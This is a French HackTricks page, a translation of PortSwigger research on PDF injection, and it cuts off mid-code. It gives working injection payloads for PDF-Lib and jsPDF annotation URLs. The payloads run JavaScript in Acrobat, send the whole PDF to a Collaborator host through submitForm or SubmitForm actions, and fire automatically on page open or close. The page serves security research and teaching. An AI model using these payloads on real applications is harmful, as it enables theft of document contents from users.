<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PRs aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Si vos donn√©es sont refl√©t√©es √† l'int√©rieur d'un fichier PDF, vous pouvez essayer d'injecter des donn√©es PDF pour ex√©cuter du JavaScript ou voler le contenu du PDF.**

Les informations suivantes ont √©t√© prises de [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

Cette fois, j'utilisais [PDFLib](https://pdf-lib.js.org). J'ai pris du temps pour utiliser la biblioth√®que afin de cr√©er une annotation et voir si je pouvais injecter une parenth√®se fermante dans l'URI de l'annotation - et √ßa a march√© ! Le code vuln√©rable exemple que j'ai utilis√© pour g√©n√©rer le code d'annotation √©tait :

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[Code complet :](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

Comment savais-je que l'injection avait r√©ussi ? Le PDF se rendrait correctement √† moins que j'injecte une parenth√®se fermante. Cela prouvait que la parenth√®se fermante sortait de la cha√Æne et causait un code PDF invalide. Casser le PDF √©tait bien, mais je devais m'assurer que je pouvais ex√©cuter du JavaScript bien s√ªr. J'ai regard√© le code PDF rendu et j'ai remarqu√© que la sortie √©tait encod√©e en utilisant le filtre FlateDecode. J'ai √©crit un petit script pour d√©gonfler le bloc et la sortie de la section d'annotation ressemblait √† ceci :`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

Comme vous pouvez clairement le voir, la cha√Æne d'injection ferme la limite du texte avec une parenth√®se fermante, ce qui laisse une parenth√®se fermante existante qui provoque le rendu incorrect du PDF :

![Capture d'√©cran montrant une bo√Æte de dialogue d'erreur lors du chargement du PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

G√©nial, donc je pouvais casser le rendu du PDF, et maintenant ? Je devais trouver une injection qui appelait du JavaScript - l'alert(1) de l'injection PDF.

Tout comme les vecteurs XSS d√©pendent de l'analyse du navigateur, l'exploitabilit√© de l'injection PDF peut d√©pendre du moteur de rendu PDF. J'ai d√©cid√© de commencer par cibler Acrobat car je pensais que les vecteurs √©taient moins susceptibles de fonctionner dans Chrome. Deux choses que j'ai remarqu√©es : 1) Vous pouviez injecter des actions d'annotation suppl√©mentaires et 2) si vous r√©parez la parenth√®se fermante existante, alors le PDF se rendrait. Apr√®s quelques exp√©rimentations, j'ai trouv√© un joli payload qui injectait une action d'annotation suppl√©mentaire, ex√©cutait du JavaScript et r√©parait la parenth√®se fermante :`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

D'abord je sors de la parenth√®se, puis je sors du dictionnaire en utilisant >> avant de commencer un nouveau dictionnaire d'annotation. Le /S/JavaScript rend l'annotation bas√©e sur JavaScript et le /JS est o√π le JavaScript est stock√©. √Ä l'int√©rieur des parenth√®ses se trouve notre JavaScript r√©el. Notez que vous n'avez pas besoin d'√©chapper les parenth√®ses si elles sont √©quilibr√©es. Enfin, j'ajoute le type d'annotation, termine le dictionnaire et r√©pare la parenth√®se fermante. C'√©tait tellement cool ; je pouvais cr√©er une injection qui ex√©cutait du JavaScript mais alors quoi, n'est-ce pas ? Vous pouvez ex√©cuter du JavaScript mais vous n'avez pas acc√®s au DOM, donc vous ne pouvez pas lire les cookies. Puis James est apparu et a sugg√©r√© de voler le contenu du PDF √† partir de l'injection. J'ai commenc√© √† chercher des moyens d'obtenir le contenu d'un PDF. Dans Acrobat, j'ai d√©couvert que vous pouvez utiliser du JavaScript pour soumettre des formulaires sans aucune interaction utilisateur ! En regardant les sp√©cifications de l'API JavaScript, il √©tait assez simple de modifier l'injection de base et d'ajouter du JavaScript qui enverrait l'int√©gralit√© du contenu du code PDF √† un serveur externe dans une requ√™te POST :`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

L'alerte n'est pas n√©cessaire ; je l'ai juste ajout√©e pour prouver que l'injection ex√©cutait du JavaScript.

Ensuite, juste pour le plaisir, j'ai regard√© comment voler le contenu du PDF sans utiliser de JavaScript. √Ä partir de la sp√©cification PDF, j'ai d√©couvert que vous pouvez utiliser une action appel√©e SubmitForm. Je l'ai utilis√©e dans le pass√© lorsque j'ai construit un PDF pour un contr√¥le de scan dans Burp Suite. Cela fait exactement ce que le nom implique. Il a √©galement une entr√©e Flags dans le dictionnaire pour contr√¥ler ce qui est soumis. La cl√© du dictionnaire Flags accepte une seule valeur enti√®re, mais chaque param√®tre individuel est contr√¥l√© par un bit binaire. Une bonne fa√ßon de travailler avec ces param√®tres est d'utiliser les nouveaux litt√©raux binaires dans ES6. Le litt√©ral binaire doit √™tre long de 14 bits car il y a 14 drapeaux au total. Dans l'exemple suivant, tous les param√®tres sont d√©sactiv√©s :`0b00000000000000`

Pour d√©finir un drapeau, vous devez d'abord rechercher sa position de bit (tableau 237 de la [sp√©cification PDF](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000\_2008.pdf)). Dans ce cas, nous voulons d√©finir le drapeau SubmitPDF. Comme cela est contr√¥l√© par le 9√®me bit, il suffit de compter 9 bits √† partir de la droite :`0b00000100000000`

Si vous √©valuez cela avec JavaScript, cela donne la valeur d√©cimale 256. En d'autres termes, d√©finir l'entr√©e Flags √† 256 activera le drapeau SubmitPDF, ce qui provoquera l'envoi du contenu du PDF lors de la soumission du formulaire. Tout ce que nous avons √† faire est d'utiliser l'injection de base que nous avons cr√©√©e plus t√¥t et de la modifier pour appeler l'action SubmitForm au lieu de JavaScript :`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

Ensuite, j'ai appliqu√© ma m√©thodologie √† une autre biblioth√®que PDF - [jsPDF](https://parall.ax/products/jspdf) - et j'ai d√©couvert qu'elle √©tait √©galement vuln√©rable. Exploiter cette biblioth√®que √©tait assez amusant car ils ont une API qui peut s'ex√©cuter dans le navigateur et vous permet de g√©n√©rer le PDF en temps r√©el au fur et √† mesure que vous tapez. J'ai remarqu√© que, comme la biblioth√®que PDP-Lib, ils avaient oubli√© d'√©chapper les parenth√®ses √† l'int√©rieur des URL d'annotation. Ici, la propri√©t√© url √©tait vuln√©rable :`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vuln√©rable`

J'ai donc g√©n√©r√© un PDF en utilisant leur API et inject√© du code PDF dans la propri√©t√© url :

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

J'ai r√©duit le vecteur en supprimant les entr√©es de type du dictionnaire et l'entr√©e F inutile. J'ai ensuite laiss√© une parenth√®se suspendue qui serait ferm√©e par celle existante. R√©duire la taille de l'injection est important car l'application web dans laquelle vous injectez pourrait ne permettre qu'une quantit√© limit√©e de caract√®res.`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

J'ai ensuite d√©couvert qu'il √©tait possible de r√©duire encore plus le vecteur ! Acrobat permettrait une entr√©e URI et une entr√©e JavaScript dans une seule action d'annotation et ex√©cuterait heureusement le JavaScript :`/)/S/JavaScript/JS(app.alert(1)`

Des recherches suppl√©mentaires ont r√©v√©l√© que vous pouvez √©galement injecter plusieurs annotations. Cela signifie qu'au lieu de simplement injecter une action, vous pourriez sortir de l'annotation et d√©finir vos propres coordonn√©es rect pour choisir quelle section du document serait cliquable. En utilisant cette technique, j'ai pu rendre l'ensemble du document cliquable. `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Ex√©cuter des annotations sans interaction

Jusqu'√† pr√©sent, les vecteurs que j'ai d√©montr√©s n√©cessitent un clic pour activer l'action de l'annotation. Typiquement, James a pos√© la question "Pouvons-nous ex√©cuter automatiquement ?". J'ai parcouru la sp√©cification PDF et j'ai remarqu√© des fonctionnalit√©s int√©ressantes des annotations :

"Les entr√©es **PV** et **PI** permettent une distinction entre les pages qui sont ouvertes et les pages qui sont visibles. √Ä tout moment, une seule page est consid√©r√©e comme ouverte dans l'application de visualisation, tandis que plusieurs pages peuvent √™tre visibles, en fonction de la disposition des pages."

Nous pouvons ajouter l'entr√©e PV au dictionnaire et l'annotation se d√©clenchera automatiquement sur Acrobat ! Non seulement cela, mais nous pouvons √©galement ex√©cuter un payload automatiquement lorsque le document PDF est ferm√© en utilisant l'entr√©e PC. Un attaquant pourrait vous suivre lorsque vous ouvrez le PDF et le fermez.

Voici comment ex√©cuter automatiquement √† partir d'une annotation :`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Ex√©cution automatique');`

Lorsque vous fermez le PDF, cette annotation se d√©clenchera :`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h[...]
